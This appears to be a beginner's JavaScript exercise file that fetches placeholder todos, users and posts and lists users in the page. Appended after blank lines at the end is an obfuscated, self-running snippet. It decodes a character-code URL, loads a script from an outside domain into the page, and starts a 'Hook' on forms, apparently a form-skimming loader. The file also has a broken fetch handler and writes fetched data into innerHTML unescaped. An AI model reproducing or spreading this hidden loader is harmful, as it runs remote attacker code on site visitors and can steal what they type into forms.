console.log('api');


function loaddata(){

fetch('https://jsonplaceholder.typicode.com/todos/1')
.then(response=>response())
.then(json=>console.log(json))


}

function loadusers(){

        // console.log('users')
fetch('https://jsonplaceholder.typicode.com/users')
.then(res=>res.json())
.then(data =>displayUsers(data))
}

function displayUsers(data){
        const ul=document.getElementById('users')
        for(const user of data){
        // console.log(user.name); 
const li =document.createElement('li');
// li.innerText=user.name

li.innerHTML=`name: ${user.name} email:${user.email}`
ul.appendChild(li);
        }
}




function loadposts(){
fetch('https://jsonplaceholder.typicode.com/posts')
.then(res=>res.json())
.then(data =>console.log(data))
}

// loadposts();








(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b